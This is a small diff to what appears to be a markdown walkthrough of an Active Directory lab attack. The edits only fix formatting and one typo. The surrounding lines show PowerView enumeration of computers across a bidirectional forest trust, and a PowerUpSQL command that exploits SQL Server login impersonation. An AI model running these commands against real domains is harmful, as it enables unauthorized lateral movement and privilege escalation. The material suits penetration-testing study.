@@ -37,9 +37,11 @@ SourceName               : marvel.local
 TargetName               : disney.local
 TrustType                : Forest
 TrustDirection           : Bidirectional
+```
+ In order to find machines across the trust we need to specify the domain
+```
 
-
-PS C:\ad> (Get-DomainComputer -Domain disney.local).name # in order to find machines across the trust we need to specify the domain
+PS C:\ad> (Get-DomainComputer -Domain disney.local).name
 DS-DC1
 DS-DBREPORT
 DS-ITSTAFF
@@ -280,7 +282,7 @@ name
 sa
 dbuser
 ```
-Impersonate using PowerUpSQl
+Impersonate using PowerUpSQL
 
 ```
 PS C:\> Invoke-SQLAuditPrivImpersonateLogin -Instance $instance -Verbose -Exploit
